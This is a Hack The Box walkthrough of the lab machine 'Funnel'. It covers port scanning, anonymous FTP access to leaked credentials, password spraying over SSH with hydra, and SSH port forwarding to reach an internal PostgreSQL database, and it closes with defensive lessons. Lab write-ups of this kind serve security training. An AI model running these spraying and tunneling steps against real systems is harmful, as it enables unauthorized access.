---
title: "Funnel — Hack The Box Walkthrough"
description: "Chaining anonymous FTP credentials through SSH tunneling to reach PostgreSQL on Funnel."
date: 2026-09-01
category: offensive
readTime: "6 min read"
mitre:
  - "T1078"
  - "T1021.004"
tags:
  - "Hack The Box"
  - "FTP"
  - "SSH Tunneling"
  - "PostgreSQL"
  - "Password Spraying"
  - "Linux"
  - "CTF"
summary: "Chaining anonymous FTP credentials through SSH tunneling to reach PostgreSQL on Funnel."
---

**Machine:** Funnel
**Difficulty:** Very Easy
**Key Techniques:** Anonymous FTP, cleartext credential leak, password spraying, SSH local port forwarding, PostgreSQL

---

## Enumeration

### Port Scanning

```bash
nmap -sV -p 21,22 10.129.228.195
```

| Port | Service | Version |
|------|---------|---------|
| 21 | ftp | vsftpd 3.0.3 |
| 22 | ssh | OpenSSH 8.2p1 Ubuntu |

### Anonymous FTP

```bash
ftp 10.129.228.195
```

Anonymous login is allowed. The `mail_backup` directory contains employee welcome emails and a password policy PDF.

---

## Exploitation

### Credential Leak

The welcome email lists all company usernames. The password policy PDF reveals the **default password** — every user shares it.

### Password Spraying with Hydra

```bash
hydra -L users.txt -p <default_password> ssh://10.129.228.195
```

A valid SSH session is found for user `christine`:

```bash
ssh christine@10.129.228.195
```

---

## Post-Exploitation

### Enumerating Local Services

```bash
ss -tlnp
```

PostgreSQL is listening on **127.0.0.1:5432** — only accessible from the host, invisible from outside.

### SSH Local Port Forwarding

```bash
ssh -L 5432:127.0.0.1:5432 christine@10.129.228.195 -N
```

This tunnels PostgreSQL to `localhost:5432` on the attacker machine.

### Accessing PostgreSQL

```bash
psql -h 127.0.0.1 -U christine -d <db>
```

```sql
\dt
select * from flag;
```

```
flag.txt: <flag>
```

---

## Lessons Learned

1. **Anonymous FTP + sensitive documents = credential leak.** Welcome letters and password policies should never be on public FTP shares.
2. **Default passwords must be changed.** The same default worked for SSH and PostgreSQL — one leak, two services compromised.
3. **SSH local port forwarding turns internal services into attack surface.** Any service bound to `127.0.0.1` is reachable if you have shell access.
4. **Application users should have minimal database privileges.** `christine` had PostgreSQL superuser rights.
